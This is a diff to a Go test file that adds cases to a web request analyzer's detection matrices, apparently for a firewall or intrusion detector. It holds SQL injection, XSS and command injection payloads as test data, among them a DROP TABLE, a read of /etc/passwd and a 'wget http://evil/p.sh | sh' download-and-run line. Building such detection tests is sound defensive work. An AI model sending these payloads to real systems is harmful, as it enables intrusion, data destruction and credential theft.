@@ -27,8 +27,13 @@ func TestAnalyzerReadinessMatrix(t *testing.T) {
 		{name: "sqli-time-blind", method: http.MethodPost, target: "/login", contentType: "application/x-www-form-urlencoded", body: "name=admin')waitfor%20delay'0:0:5'--", category: "sqli"},
 		{name: "sqli-destructive", method: http.MethodPost, target: "/api", contentType: "application/json", body: `{"sort":"id; DROP TABLE users"}`, category: "sqli"},
 		{name: "sqli-server-side-file-read", method: http.MethodPost, target: "/api", contentType: "application/x-www-form-urlencoded", body: "id=1 union select load_file('/etc/passwd')", category: "sqli"},
+		{name: "sqli-extractvalue-error-based", method: http.MethodGet, target: "/search?q=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))", category: "sqli"},
+		{name: "sqli-pg-sleep", method: http.MethodPost, target: "/login", contentType: "application/x-www-form-urlencoded", body: "u=admin'%3Bselect%20pg_sleep(5)--", category: "sqli"},
+		{name: "sqli-char-concat-tautology", method: http.MethodGet, target: "/search?q=1%20or%20char(49)%3Dchar(49)", category: "sqli"},
 		{name: "xss-script", method: http.MethodGet, target: "/?q=%3Cscript%3Ealert(1)%3C/script%3E", category: "xss"},
 		{name: "xss-unicode-escaped", method: http.MethodGet, target: `/profile?bio=\u003cimg src=x onerror=alert(1)\u003e`, category: "xss"},
+		{name: "xss-nul-javascript-uri", method: http.MethodGet, target: "/?next=%3Ca%20href%3Djava%00script%3Aalert(1)%3Ego%3C%2Fa%3E", category: "xss"},
+		{name: "xss-entity-event-handler", method: http.MethodGet, target: "/?q=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(1)%26gt%3B", category: "xss"},
 		{name: "xss-cookie", method: http.MethodGet, target: "/checkout", cookie: &http.Cookie{Name: "return_to", Value: "%3Csvg%20onload%3Dalert(1)%3E"}, category: "xss"},
 		{name: "rce-shell-chain", method: http.MethodGet, target: "/run?cmd=1%3Bcat%20/etc/passwd", category: "rce"},
 		{name: "rce-download-pipe-shell", method: http.MethodPost, target: "/hook", contentType: "application/x-www-form-urlencoded", body: "cmd=wget http://evil/p.sh | sh", category: "rce"},
@@ -80,6 +85,8 @@ func TestAnalyzerReadinessBenignMatrix(t *testing.T) {
 		{name: "zip-text", target: "/comment", contentType: "application/x-www-form-urlencoded", body: "note=The zip on my coat is stuck"},
 		{name: "curl-documentation", target: "/docs", contentType: "application/json", body: `{"example":"Use curl https://example.com to fetch docs"}`},
 		{name: "html-education", target: "/learn", contentType: "application/x-www-form-urlencoded", body: "lesson=HTML uses script tags in examples without execution context"},
+		{name: "sql-function-documentation", target: "/docs", contentType: "application/json", body: `{"text":"The char() and concat() SQL functions are documented here without user input execution."}`},
+		{name: "javascript-uri-documentation", target: "/docs", contentType: "application/json", body: `{"text":"This page explains why javascript: URLs are dangerous, but includes no tag attribute."}`},
 		{name: "public-url", target: "/fetch?url=https://example.com/feed.xml"},
 	}
 	for _, tc := range cases {
